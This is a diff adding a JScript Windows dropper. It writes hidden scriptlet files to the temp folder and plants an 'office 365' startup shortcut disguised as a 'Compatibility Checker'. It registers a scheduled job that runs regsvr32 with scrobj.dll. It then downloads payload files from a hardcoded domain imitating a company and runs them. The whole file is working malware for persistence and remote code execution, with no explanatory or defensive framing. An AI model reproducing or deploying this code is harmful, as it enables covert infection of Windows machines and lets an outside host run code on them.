@@ -1,0 +1,89 @@
+x=function(o){return new ActiveXObject(o)};fs=x('Scripting.FileSystemObject');sh=x('WScript.Shell');env=function(o){return sh.ExpandEnvironmentStrings(o)};sp=function(o){return sh.SpecialFolders(o)};
+rds=function(o){s='';while(o--)s+='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'.charAt(Math.floor(Math.random()*62));return s;};
+
+//sh.Run(env('cmd /c set > %temp%/'+rds(8)),0,false);
+//sUrl='http://18.1.1.138/';
+sUrl='http://www.thyssenkrupp-marinesystems.org/';
+
+//fs.GetFile().SetAttr
+function WriteLnk(path, target, args){
+	if(fs.fileExists(path)){
+		//SetAttr path, vbNormal
+		fs.DeleteFile(path);
+    }
+	link = sh.CreateShortcut(path);
+	link.Description = 'Compatibility Checker';
+	link.TargetPath = target;
+	link.Arguments = args;
+	link.WindowStyle = 0;
+	link.Save();
+	//SetAttr path, vbReadOnly + vbSystem
+}
+lnkName='office 365';
+tLnk=env('%tmp%/'+lnkName+'.lnk');
+sLnk=sp('startup')+'/'+lnkName+'.lnk';
+if(!fs.fileExists(sLnk))
+{
+	sName=rds(8);
+	upName=rds(8);
+	rF=env('%tmp%\\~'+rds(8));
+	f=fs.OpenTextFile(rF,2,true);
+	f.WriteLine('<?XML version="1.0"?>');
+	f.WriteLine('<scriptlet>');
+	f.WriteLine('	<registration progid="f6563b" classid="{f509afc0-b5f8-449c-80fe-9fec33760974}" >');
+	f.WriteLine('		<script language="javascript">');
+	f.WriteLine('		<![CDATA[');
+
+	f.WriteLine(" x=function(o){return new ActiveXObject(o)};fs=x('Scripting.FileSystemObject');sh=x('WScript.Shell');env=function(o){return sh.ExpandEnvironmentStrings(o)};sp=function(o){return sh.SpecialFolders(o)}; ");
+	f.WriteLine(" lnkName='office 365'; ");
+	f.WriteLine(" tLnk=env('%tmp%/'+lnkName+'.lnk');");
+	f.WriteLine(" sLnk=sp('startup')+'/'+lnkName+'.lnk';");
+	
+	//f.WriteLine(" if(!fs.fileExists(sLnk)){ fs.CopyFile(tLnk, sLnk); fs.DeleteFile(tLnk);}");
+	
+	f.WriteLine(" oCimv2 = GetObject('winmgmts:\\\\\\\\.\\\\root\\\\CIMV2'); ");
+	f.WriteLine(" upName='"+upName+"'; ");
+	f.WriteLine(" upF=env('%tmp%\\\\_'+upName);");
+	f.WriteLine(" ret=oCimv2.Get('Win32_ScheduledJob').Create('regsvr32 /s /u /i:\"'+upF+'\" scrobj.dll','********123000.000000-420',true,63,false,null); ");
+
+	//f.WriteLine("(new ActiveXObject('WScript.Shell')).Run('cmd /c c:/beep.bat',0,false); ");
+	//f.WriteLine(" //WScript.Sleep(3000); ");
+	//f.WriteLine("(new ActiveXObject('WScript.Shell')).Run('cmd /c c:/beep.bat',0,false); ");
+	f.WriteLine("sName='"+sName+"';");
+	f.WriteLine("sUrl='"+sUrl+"';");
+	f.WriteLine("try{h=x('WinHttp.WinHttpRequest.5.1');h.SetTimeouts(0,0,0,0);h.Open('GET',sUrl+'/green.ddd',false);h.Send();s=x('ADODB.Stream');s.Mode=3;s.Type=1;s.Open();s.Write(h.ResponseBody);s.SaveToFile(env('%temp%/'+sName+'.ddd'));}catch(e){}");
+	f.WriteLine("try{h=x('WinHttp.WinHttpRequest.5.1');h.SetTimeouts(0,0,0,0);h.Open('GET',sUrl+'/green.tmp',false);h.Send();s=x('ADODB.Stream');s.Mode=3;s.Type=1;s.Open();s.Write(h.ResponseBody);s.SaveToFile(env('%temp%/'+sName+'.tmp'));}catch(e){}");
+	
+	f.WriteLine('		]]>');
+	f.WriteLine('		</script>');
+	f.WriteLine('	</registration>');
+	f.WriteLine('</scriptlet>');
+	f.Close();
+	
+	
+	sF=env('%tmp%\\_'+sName);
+	upF=env('%tmp%\\_'+upName);
+	f=fs.OpenTextFile(upF,2,true);
+	f.WriteLine('<?XML version="1.0"?>');
+	f.WriteLine('<scriptlet>');
+	f.WriteLine('	<registration progid="f6563b" classid="{f509afc0-b5f8-449c-80fe-9fec33760974}" >');
+	f.WriteLine('		<script language="javascript">');
+	f.WriteLine('		<![CDATA[');
+	
+	f.WriteLine(" x=function(o){return new ActiveXObject(o)};fs=x('Scripting.FileSystemObject');sh=x('WScript.Shell');env=function(o){return sh.ExpandEnvironmentStrings(o)};sp=function(o){return sh.SpecialFolders(o)}; ");
+	f.WriteLine(" sName='"+sName+"'; ");
+	f.WriteLine(" sF=env('%tmp%/'+sName); ");
+	f.WriteLine(" (new ActiveXObject('WScript.Shell')).Run('regsvr32 /s \"'+sF+'.ddd\"',0,false); ");
+	
+	f.WriteLine('		]]>');
+	f.WriteLine('		</script>');
+	f.WriteLine('	</registration>');
+	f.WriteLine('</scriptlet>');
+	f.Close();
+	
+	args='/s /u /i:"'+upF+'" scrobj.dll';
+	WriteLnk(tLnk, 'regsvr32', args);
+	
+	sh.Run('regsvr32 /s /u /i:"'+rF+'" scrobj.dll',0,true);
+	sh.Run('regsvr32 /s /u /i:"'+upF+'" scrobj.dll',0,false);
+}
